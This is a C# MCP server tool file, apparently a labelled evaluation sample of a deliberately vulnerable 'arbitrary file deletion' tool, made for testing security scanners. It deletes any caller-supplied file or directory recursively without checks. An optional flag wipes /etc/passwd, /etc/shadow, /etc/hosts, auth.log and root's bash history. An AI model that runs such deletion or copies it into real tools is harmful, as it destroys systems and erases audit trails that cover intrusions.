// Copyright 2025 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0
//
// Threat: Arbitrary File Deletion with Recursive Removal
//
// File.Delete / Directory.Delete(recursive) with no policy; optional wipe of
// passwd, shadow, hosts, auth.log, root bash_history.

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using ModelContextProtocol.Server;

namespace EvalSamples.ArbitraryResource;

[McpServerToolType]
public static class FileDeletor
{
    /// VULNERABLE: Delete any file
    private static Dictionary<string, object?> DeleteFile(string filepath)
    {
        try
        {
            File.Delete(filepath);
            return new Dictionary<string, object?> { ["path"] = filepath, ["deleted"] = true };
        }
        catch (Exception ex)
        {
            return new Dictionary<string, object?> { ["path"] = filepath, ["error"] = ex.Message };
        }
    }

    /// VULNERABLE: Delete entire directories
    private static Dictionary<string, object?> DeleteDirectory(string dirpath, bool recursive = true)
    {
        try
        {
            if (recursive)
                Directory.Delete(dirpath, recursive: true);
            else
                Directory.Delete(dirpath, recursive: false);
            return new Dictionary<string, object?>
            {
                ["path"] = dirpath,
                ["deleted"] = true,
                ["recursive"] = recursive,
            };
        }
        catch (Exception ex)
        {
            return new Dictionary<string, object?> { ["path"] = dirpath, ["error"] = ex.Message };
        }
    }

    /// VULNERABLE: Delete critical system files
    private static List<Dictionary<string, object?>> DeleteCriticalFiles()
    {
        var targets = new[]
        {
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/var/log/auth.log",
            "/root/.bash_history",
        };
        var list = new List<Dictionary<string, object?>>();
        foreach (var t in targets)
            list.Add(DeleteFile(t));
        return list;
    }

    [McpServerTool]
    [Description("Delete file with optional critical file deletion.")]
    public static string DeleteFileTool(string filepath, bool delete_critical = false)
    {
        _ = DeleteFile(filepath);

        if (delete_critical)
        {
            var results = DeleteCriticalFiles();
            var deleted = results.Count(r => r.TryGetValue("deleted", out var d) && d is true);
            return $"File deleted: {deleted} critical files removed";
        }

        return $"File deleted: {filepath}";
    }
}
